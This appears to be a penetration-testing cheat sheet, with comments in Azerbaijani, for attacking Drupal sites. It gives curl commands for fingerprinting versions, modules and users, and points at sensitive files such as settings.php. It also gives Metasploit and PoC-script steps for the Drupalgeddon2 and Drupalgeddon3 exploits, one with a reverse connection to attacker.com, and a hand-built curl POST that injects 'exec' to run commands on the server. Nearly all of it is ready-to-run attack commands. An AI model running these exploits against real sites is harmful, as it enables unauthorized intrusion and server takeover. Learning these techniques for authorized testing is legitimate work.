# Drupal Enumeration
```powershell
curl -s http://drupal.inlanefreight.local | grep Drupal

curl -s https://target.com/robots.txt
# Tipik Drupal robots.txt:
# Disallow: /core/
# Disallow: /profiles/
# Disallow: /sites/
```

# Version Enumeration
```powershell
curl -s https://target.com/CHANGELOG.txt | head -10

curl -s https://target.com/core/CHANGELOG.txt | head -10

curl -s https://target.com/install.php | grep -i drupal

curl -s https://target.com/node/1 | grep -i drupal

curl -s https://target.com | grep "misc/drupal.js"
```


# Critical Files
```powershell
# Login
https://target.com/user/login
https://target.com/user

# Admin panel
https://target.com/admin
https://target.com/admin/config
https://target.com/admin/modules
https://target.com/admin/appearance
https://target.com/admin/people

# Həssas fayllar
https://target.com/CHANGELOG.txt
https://target.com/core/CHANGELOG.txt
https://target.com/sites/default/settings.php
https://target.com/sites/default/settings.php.bak
https://target.com/xmlrpc.php
https://target.com/cron.php
```

# Active Enumeration with DROOPESCAN
```powershell
# Quraşdırma
pip install droopescan
# və ya
git clone https://github.com/SamJoan/droopescan
cd droopescan && pip install -r requirements.txt

# Əsas scan
droopescan scan drupal --url https://target.com

# Thread ilə sürətli scan
droopescan scan drupal --url https://target.com --threads 20

# Verbose
droopescan scan drupal --url https://target.com -v

# JSON output
droopescan scan drupal --url https://target.com \
            --output-format json > report.json
```

# Enumeration with CMSmap
```powershell
# Quraşdırma
git clone https://github.com/Dionach/CMSmap
pip install .

# Scan
cmsmap https://target.com

# Exploit yoxlama
cmsmap https://target.com -e
```

# MSFCONSOLE drupalgeddon
```powershell
msfconsole
# Drupalgeddon2 (CVE-2018-7600)
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS target.com
set TARGETURI /
run

# Drupalgeddon3 (CVE-2018-7602)
use exploit/unix/webapp/drupal_restws_unserialize
set RHOSTS target.com
run


# PoC skript
git clone https://github.com/dreadlocked/Drupalgeddon2
cd Drupalgeddon2
gem install highline
ruby drupalgeddon2.rb https://target.com

# Manuel yoxlama
curl -s -X POST \
  "https://target.com/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
  --data 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id'

# Metasploit
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS target.com
set LHOST attacker.com
set LPORT 4444
run
```

# Module Enumeration
```powershell
# Modullar /modules/ qovluğunda
curl -s https://target.com/modules/
curl -s https://target.com/sites/all/modules/

# Modul mövcudluğunu yoxla
for mod in views token pathauto ctools date; do
  code=$(curl -o /dev/null -s -w "%{http_code}" \
         https://target.com/modules/$mod/)
  echo "$mod: $code"
done

# Modul versiyası
curl -s https://target.com/modules/<modul_adi>/<modul_adi>.info
curl -s https://target.com/modules/<modul_adi>/README.txt
```

# User Enumeration
```powershell
# User ID ilə profil
curl -s https://target.com/user/1
curl -s https://target.com/user/2

# JSON:API ilə (Drupal 8.5+)
curl -s https://target.com/jsonapi/user/user

# Node enumeration
curl -s https://target.com/node/1
curl -s https://target.com/node/1?_format=json

# JSON:API node
curl -s https://target.com/jsonapi/node/article
curl -s https://target.com/jsonapi/node/page

# REST session token
curl -s https://target.com/rest/session/token
```

#

